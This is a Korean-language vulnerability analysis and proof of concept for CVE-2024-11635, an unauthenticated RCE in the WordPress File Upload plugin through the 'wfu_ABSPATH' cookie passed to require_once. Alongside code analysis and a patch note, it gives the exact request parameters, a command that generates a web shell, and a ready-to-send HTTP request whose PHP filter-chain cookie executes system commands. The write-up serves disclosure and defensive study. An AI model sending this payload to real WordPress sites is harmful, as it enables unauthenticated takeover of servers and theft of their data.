# CVE-2024-11635

## Index
* [📌 Analysis](#📌-analysis)
    * [1. 개요](#1-개요)
    * [2. 취약점 분석](#2-취약점-분석)
* [📌 PoC](#📌-poc)
    * [1. 요청 데이터 확인](#1-요청-데이터-확인)
    * [2. PHP 악성 코드 작성(PHP Filter Chain)](#2-php-악성-코드-작성php-filter-chain)
    * [3. 익스플로인](#3-익스플로잇)
    * [4. PoC 코드: HTTP Request Packet](#4-poc-코드-http-request-packet)
* [📌 패치 확인](#-패치-확인)

## 📌 Analysis

### 1. 개요

WordPress File Upload 플러그인은 파일을 업로드하는 Short Code 폼을 제공하고 업로드된 파일을 관리할 수 있도록 도와주는 플러그인입니다. 이 플러그인의 4.24.12 버전 이하에서는 파일 다운로드를 요청할 때, 쿠키 `wfu_ABSPATH` 를 사용하며, 해당 값이 `include` 함수로 전달되어 RCE(Remote Code Execution) 취약점이 발생합니다.

### 2. 취약점 분석

WordPress File Upload 플러그인은 업로드 폼(단축코드, `[wordpress_file_upload]`)을 이용하여 업로드된 파일 목록은 Uploaded Files 라는 대시보드 메뉴(`/wp-admin/admin.php?page=wfu_uploaded_files`)에서 확인하실 수 있습니다.

업로드된 파일은 다운로드 기능을 제공하며 Actions 탭의 다운로드 버튼을 클릭하면 됩니다.

![image](images/image-001.png)

위 다운로드 버튼을 클릭하면 HTTP 패킷 요청이 발생되며, 이후 `/wp-content/plugins/wp-file/upload/wfu_file_downloader.php` 를 요청하여 다운로드 하려는 파일의 데이터를 내려받게 됩니다.

![image](images/image-002.png)

`/wp-content/plugins/wp-file/upload/wfu_file_download.php` 파일은 요청 시 변수 초기화 과정 이후에 함수`wfu_download_file` 를 호출합니다.

![image](images/image-003.png)

함수 `wfu_download_file` 는 처리 과정에서 다시 `wfu_update_download_statsu` 함수를 호출하여 다운로드 상태를 저장합니다.

![image](images/image-004.png)

이때, 호출된 `wfu_update_download_statsu` 함수의 구현 로직에서 클라이언트 요청 값 중 Cookie `wfu_ABSPATH` 를 문자열 `wp-laod.php` 와 결합하여 함수`require_once` 로 전달하는 것을 확인하실 수 있습니다.

```php
function wfu_update_download_status($ticket, $new_status) {
	require_once WFU_USVAR_downloader('wfu_ABSPATH').'wp-load.php'; // <- Here
	WFU_USVAR_store('wfu_download_status_'.$ticket, $new_status);
}
```

즉, 해당 위치에서 사용자로부터 전달된 데이터가 `require_once` 함수의 인자로 전달되어 LFI(Local File Inclusion) 취약점이 발생될 수 있고 이 LFI 취약점을 통해 RCE 취약점(LFI2RCE)으로 확대시킬 수 있습니다.

> `require_once` 함수의 인자로 전달된 `wfu_ABSPATH` 쿠키 값은 `wp-load.php` 와 결합되는데 이는 `PHP Filter Chain` 기법을 이용하여 그 중 `php://temp` 스트림 전달을 통해 우회할 수 있습니다.
> 

또한, `/wp-content/plugins/wp-file/upload/wfu_file_download.php` 요청 시, 처리 과정에서 사용자 접근 제한을 검사하고 있지 않기 때문에 인증되지 않은 사용자가 요청할 수 있습니다. 

## 📌 PoC

### 1. 요청 데이터 확인

`/wp-content/plugins/wp-file/upload/wfu_file_download.php` 를 요청할 때, 처리 과정에서 필요한 데이터가 존재하지 않을 경우 `die` 함수를 통해 처리가 종료됩니다.

![image](images/image-005.png)

따라서, 취약점이 발생했던 함수 `wfu_update_download_status` 가 호출되도록 URL 파라미터를 다음과 같이 전달합니다.

> URL 파라미터 `handler` 와 `dboption_base` 는 각각 `dboption`, `cookies` 로 지정해야 한다.
> 

```php
/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?handler=dboption&dboption_base=cookies&file=FOO&ticket=FOO&session_legacy=FOO&dboption_useold=FOO&wfu_cookie=FOO
```

![image](images/image-006.png)

### 2. PHP 악성 코드 작성(PHP Filter Chain)

Python 기반의 PHP Filter Chain 도구인 [PHP Filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) 를 사용하여 웹 쉘 코드 `<?php system($_GET['cmd']);?>` 를 생성합니다.

```php
python3 php_filter_chain_generator.py --chain "<?php system(\$_GET['cmd'])?>"
```

![image](images/image-007.png)

### 3. 익스플로잇

PHP 필터 체인 기법을 통해 생성한 값을 쿠키 `wfu_ABSPATH` 에 설정하고 URL 파라미터 `cmd` 에 임의의 명령어(`id`) 를 추가하여 요청합니다.

![image](images/image-008.png)

결과적으로, PHP Filter Chain 기법을 이용하여 입력한 웹 쉘 코드(`<?php system($_GET['cmd']);?>`)가 쿠키 `wfu_ABSPATH` 로 전달되었고, 이 쿠키 값이 `require_once` 함수의 인자로 전달되어 임의의 명령어 `id` 가 실행된 것을 확인하실 수 있습니다.

### 4. PoC 코드: HTTP Request Packet

```
GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=FOO&ticket=FOO&handler=dboption&session_legacy=FOO&dboption_base=cookies&dboption_useold=FOO&wfu_cookie=FOO&cmd=id HTTP/1.1
Host: localhost:8080
Cookie: wfu_ABSPATH=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp;
```

## 📌 패치 확인

패치된 버전에서는 쿠키 `wfu_ABSPATH` 에 입력된 값이 `require_once` 함수의 인자로 전달되지 않도록 전역 변수 `wfu_downloader_dawta` 로 부터 값을 가져오도록 변경되었습니다.

> https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3188858%40wp-file-upload&old=3164451%40wp-file-upload&sfp_email=&sfph_mail=#file173
> 

![image](images/image-009.png)